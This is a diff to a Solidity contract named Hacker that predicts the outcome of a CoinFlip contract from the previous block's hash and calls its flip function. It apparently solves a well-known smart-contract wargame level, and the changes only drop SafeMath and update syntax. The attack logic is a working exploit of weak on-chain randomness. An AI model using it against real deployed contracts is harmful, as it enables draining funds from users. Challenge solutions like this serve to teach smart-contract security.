@@ -1,12 +1,9 @@
 // SPDX-License-Identifier: MIT
-pragma solidity >=0.8.5 <0.9.0;
+pragma solidity ^0.8.0;
 
-import "@openzeppelin/contracts/utils/math/SafeMath.sol";
-import "./CoinFlip.sol";
+import {CoinFlip} from "./CoinFlip.sol";
 
 contract Hacker {
-  using SafeMath for uint256;
-
   address public hacker;
 
   uint256 private lastHash;
@@ -24,14 +21,14 @@ contract Hacker {
   /// @notice Simulate the target contract `flip` logic, and provide the predicted value
   /// @return The result of the one flip
   function attack(address _targetAddress) public onlyHacker returns (bool) {
-    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+    uint256 blockValue = uint256(blockhash(block.number - 1));
 
     if (lastHash == blockValue) {
       revert();
     }
 
     lastHash = blockValue;
-    uint256 coinFlip = blockValue.div(FACTOR);
+    uint256 coinFlip = blockValue/FACTOR;
     bool side = coinFlip == 1 ? true : false;
 
     return CoinFlip(_targetAddress).flip(side);
